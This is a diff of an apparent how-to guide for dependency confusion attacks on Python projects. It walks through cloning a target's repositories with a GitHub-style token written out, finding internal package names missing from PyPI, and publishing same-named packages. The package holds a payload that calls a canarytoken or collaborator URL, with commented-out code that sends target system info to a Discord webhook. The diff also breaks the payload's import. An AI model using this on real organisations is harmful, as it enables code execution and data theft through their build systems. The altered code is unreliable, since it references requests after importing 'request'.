@@ -20,14 +20,14 @@ $ ghorg clone <target> -t <token>
 `example: $ ghorg clone google -t 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`
     
     
-- After Download all repository 
+- After Download all repository finds vulnerable python package
 
 ```bash 
 $ find . -type f -name requirements.txt | xargs -n1 -I{} cat {} | cut -d ">" -f 1 | cut -d " " -f 1 |  sort -u | cut -d "=" -f1 | xargs -n1 -I{} echo "https://pypi.org/project/{}/" | httpx -status-code -silent -content-length -mc 404
 ```
 - 404 code means this package not available publicly So This the vulnerable to dependencies confusion.
 
-- Publish this python packages publicly (https://pypi.org)
+- So now Publish this python packages publicly (https://pypi.org)
 
 ```bash
 $ mkdir <package-name>
@@ -52,14 +52,14 @@ $ touch __init__.py
 # Impact this vulnerability: Remote code execution(RCE)
 
 
-from discord import SyncWebhook
-import requests
-import os
+import request
+#from discord import SyncWebhook
+#import os
 
 ## canarytokens_url OR burp collaborator URL
 requests.get("canarytokens_url")
 
-## Send target info to your discord server 
+## Send target system info to your discord server 
 #webhook = SyncWebhook.from_url("<discord_webhook_url>")
 
 #osname =  os.uname()
@@ -77,7 +77,8 @@ $ cd ..
 ```bash
 $ touch setup.py
 ```
-
+- [+]note: The version of package and the version of the vulnerable package must be same
+    
 ```bash 
 from setuptools import setup, find_packages
 import codecs
